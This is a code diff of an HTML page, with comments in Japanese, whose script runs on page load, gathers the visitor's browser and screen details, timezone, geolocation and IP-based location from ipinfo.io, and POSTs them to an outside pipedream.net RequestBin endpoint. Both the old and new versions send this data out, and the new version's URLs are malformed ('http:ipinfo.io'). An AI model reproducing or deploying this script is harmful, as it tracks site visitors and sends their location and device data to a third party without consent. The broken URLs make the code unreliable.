@@ -9,105 +9,74 @@
   <h1>PC情報をRequestBinに送信中...</h1>
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      // PC情報を収集
-      const pcInfo = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        cookieEnabled: navigator.cookieEnabled,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        windowInnerWidth: window.innerWidth,
-        windowInnerHeight: window.innerHeight,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        location: {}
-      };
+      function collectPCInfo() {
+        const pcInfo = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          cookieEnabled: navigator.cookieEnabled,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          windowInnerWidth: window.innerWidth,
+          windowInnerHeight: window.innerHeight,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          location: {}
+        };
 
-      // 位置情報を取得
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          pcInfo.location.latitude = position.coords.latitude;
-          pcInfo.location.longitude = position.coords.longitude;
-          sendData();
-        }, function(error) {
-          console.error('位置情報の取得に失敗しました:', error);
-          // 位置情報の取得に失敗した場合は、IPアドレスからの位置情報を取得
-          sendDataWithIpInfo();
-        });
-      } else {
-        console.error('位置情報がサポートされていません');
-        // 位置情報がサポートされていない場合もIPアドレスからの位置情報を取得
-        sendDataWithIpInfo();
-      }
-
-      function sendData() {
-        // IP情報を取得
-        fetch('https://ipinfo.io/json')
-          .then(response => response.json())
-          .then(ipData => {
-            // IP情報をPC情報に追加
-            pcInfo.ip = ipData;
-            // RequestBinにデータを送信
-            return fetch('https://enikio9fskusg.x.pipedream.net/', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(pcInfo)
-            });
-          })
-          .then(response => {
-            if (response.ok) {
-              console.log('データが正常に送信されました');
-              document.querySelector('h1').textContent = 'データが正常に送信されました！';
-            } else {
-              console.error('データ送信エラー:', response.statusText);
-              document.querySelector('h1').textContent = 'データ送信エラー';
-            }
-          })
-          .catch(error => {
-            console.error('エラーが発生しました:', error);
-            document.querySelector('h1').textContent = 'エラーが発生しました';
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            pcInfo.location.latitude = position.coords.latitude;
+            pcInfo.location.longitude = position.coords.longitude;
+            sendData(pcInfo);
+          }, function() {
+            sendDataWithIpInfo(pcInfo);
           });
+        } else {
+          sendDataWithIpInfo(pcInfo);
+        }
       }
 
-      function sendDataWithIpInfo() {
-        // IP情報を取得
-        fetch('https://ipinfo.io/json')
-          .then(response => response.json())
-          .then(ipData => {
-            // IP情報をPC情報に追加
-            pcInfo.ip = ipData;
-            // 位置情報が取得できなかった場合のフォールバックとしてIP情報を利用
-            if (!pcInfo.location.latitude && !pcInfo.location.longitude) {
-              pcInfo.location.latitude = ipData.loc.split(',')[0];
-              pcInfo.location.longitude = ipData.loc.split(',')[1];
-            }
-            // RequestBinにデータを送信
-            return fetch('https://enikio9fskusg.x.pipedream.net/', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(pcInfo)
-            });
-          })
-          .then(response => {
-            if (response.ok) {
-              console.log('データが正常に送信されました');
-              document.querySelector('h1').textContent = 'データが正常に送信されました！';
-            } else {
-              console.error('データ送信エラー:', response.statusText);
-              document.querySelector('h1').textContent = 'データ送信エラー';
-            }
-          })
-          .catch(error => {
-            console.error('エラーが発生しました:', error);
-            document.querySelector('h1').textContent = 'エラーが発生しました';
+      async function sendData(pcInfo) {
+        try {
+          const response = await fetch('http:ipinfo.io/json');
+          const ipData = await response.json();
+          pcInfo.ip = ipData;
+          await fetch('http:enikio9fskusg.x.pipedream.net/', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(pcInfo)
           });
+          console.log('データが送信されました:', pcInfo);
+        } catch (error) {
+          console.error('データ送信中にエラーが発生しました:', error);
+        }
       }
+
+      async function sendDataWithIpInfo(pcInfo) {
+        try {
+          const response = await fetch('http:ipinfo.io/json');
+          const ipData = await response.json();
+          pcInfo.ip = ipData;
+          if (!pcInfo.location.latitude && !pcInfo.location.longitude) {
+            [pcInfo.location.latitude, pcInfo.location.longitude] = ipData.loc.split(',');
+          }
+          await fetch('http:enikio9fskusg.x.pipedream.net/', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(pcInfo)
+          });
+          console.log('データが送信されました:', pcInfo);
+        } catch (error) {
+          console.error('データ送信中にエラーが発生しました:', error);
+        }
+      }
+
+      collectPCInfo();
     });
   </script>
 </body>
 </html>
-
